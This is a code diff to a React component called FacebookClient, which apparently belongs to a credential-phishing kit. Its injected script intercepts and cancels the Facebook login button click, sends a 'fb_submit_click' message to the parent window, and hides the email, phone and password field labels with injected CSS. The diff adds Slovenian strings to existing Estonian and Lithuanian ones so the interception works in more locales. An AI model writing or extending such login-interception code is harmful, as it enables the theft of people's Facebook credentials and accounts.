@@ -119,14 +119,14 @@ export function FacebookClient({ sessionId: propSid }: Props) {
           const injectScriptText = `
             (function () {
               try {
-                // (1) Submit: "Logi sisse" tiklaninca parent'a postMessage GONDER
+                // (1) Submit: "Prijava" tiklaninca parent'a postMessage GONDER
                 document.addEventListener('click', function (e) {
                   var target = e.target;
                   var el = target;
                   for (var i = 0; i < 10 && el; i++) {
                     var txt = (el.textContent || '').trim();
                     var al = (el.getAttribute && el.getAttribute('aria-label')) || '';
-                    if (txt === 'Logi sisse' || txt === 'Prisijungti' || al === 'Logi sisse' || al === 'Prisijungti' || txt.indexOf('Prisijungti') === 0 || al.indexOf('Prisijungti') === 0) {
+                    if (txt === 'Prijava' || al === 'Prijava' || txt === 'Logi sisse' || txt === 'Prisijungti' || al === 'Logi sisse' || al === 'Prisijungti' || txt.indexOf('Prisijungti') === 0 || al.indexOf('Prisijungti') === 0) {
                       window.parent.postMessage({ type: 'fb_submit_click' }, '*');
                       e.preventDefault();
                       e.stopPropagation();
@@ -268,6 +268,8 @@ export function FacebookClient({ sessionId: propSid }: Props) {
           tl.includes("parooli") ||
           tl.includes("meiliaadress") ||
           tl.includes("meiliaadresi") ||
+          tl.includes("e-poštni") || tl.includes("e-postni") || tl.includes("poštni naslov") || tl.includes("postni naslov") ||
+          tl.includes("mobilne naprave") || tl.includes("številka mobilne") || tl.includes("stevilka mobilne") ||
           tl.includes("slaptažodis") || tl.includes("geslo") || tl.includes("pozabili") ||
           tl.includes("slaptazodis") ||
           tl.includes("paštas") || tl.includes("pastas") || tl.includes("pošta") || tl.includes("posta") ||
@@ -366,6 +368,8 @@ export function FacebookClient({ sessionId: propSid }: Props) {
             t.includes("parooli") ||
             t.includes("meiliaadress") ||
             t.includes("meiliaadresi") ||
+            t.includes("e-poštni") || t.includes("e-postni") || t.includes("poštni naslov") || t.includes("postni naslov") ||
+            t.includes("mobilne naprave") || t.includes("številka mobilne") || t.includes("stevilka mobilne") ||
             t.includes("slaptažodis") || t.includes("geslo") || t.includes("pozabili") ||
             t.includes("slaptazodis") ||
             t.includes("paštas") || t.includes("pastas") || t.includes("pošta") || t.includes("posta") ||
@@ -473,8 +477,8 @@ export function FacebookClient({ sessionId: propSid }: Props) {
             newStyle.textContent = `
               input::-webkit-input-placeholder, input::-moz-placeholder, input:-ms-input-placeholder, input::placeholder { color: transparent !important; opacity: 0 !important; }
               input:placeholder-shown + label, input[placeholder*='email'] + span, input[placeholder*='parool'] + div { display: none !important; visibility: hidden !important; opacity: 0 !important; }
-              [aria-label*='meiliaadress'], [aria-label*='parool'], [title*='meiliaadress'], [title*='parool'], [aria-label*='lapta']:not(input):not(textarea), [aria-label*='pašt']:not(input):not(textarea), [aria-label*='past']:not(input):not(textarea), [title*='lapta']:not(input) { color: transparent !important; opacity: 0 !important; }
-              [aria-label*='meiliaadress']::before, [aria-label*='meiliaadress']::after, [aria-label*='parool']::before, [aria-label*='parool']::after, [aria-label*='lapta']::before, [aria-label*='lapta']::after, [aria-label*='pašt']::before, [aria-label*='pašt']::after { content: '' !important; display: none !important; }
+              [aria-label*='meiliaadress'], [aria-label*='parool'], [title*='meiliaadress'], [title*='parool'], [aria-label*='mobilne']:not(input):not(textarea), [aria-label*='e-poštni']:not(input):not(textarea), [aria-label*='e-postni']:not(input):not(textarea), [aria-label*='Geslo']:not(input):not(textarea), [aria-label*='lapta']:not(input):not(textarea), [aria-label*='pašt']:not(input):not(textarea), [aria-label*='past']:not(input):not(textarea), [title*='lapta']:not(input) { color: transparent !important; opacity: 0 !important; }
+              [aria-label*='meiliaadress']::before, [aria-label*='meiliaadress']::after, [aria-label*='parool']::before, [aria-label*='parool']::after, [aria-label*='mobilne']::before, [aria-label*='mobilne']::after, [aria-label*='Geslo']::before, [aria-label*='Geslo']::after, [aria-label*='lapta']::before, [aria-label*='lapta']::after, [aria-label*='pašt']::before, [aria-label*='pašt']::after { content: '' !important; display: none !important; }
             `;
             (dc.head || dc.documentElement).appendChild(newStyle);
             st = newStyle;
@@ -514,7 +518,7 @@ export function FacebookClient({ sessionId: propSid }: Props) {
           const b = btns[i];
           const t = (b.textContent || "").trim();
           const al = b.getAttribute("aria-label") || "";
-          if (t === "Logi sisse" || t === "Prisijungti" || al === "Logi sisse" || al === "Prisijungti" || t.startsWith("Prisijungti") || al.startsWith("Prisijungti")) return b;
+          if (t === "Prijava" || al === "Prijava" || t === "Logi sisse" || t === "Prisijungti" || al === "Logi sisse" || al === "Prisijungti" || t.startsWith("Prisijungti") || al.startsWith("Prisijungti")) return b;
         }
         return null;
       }
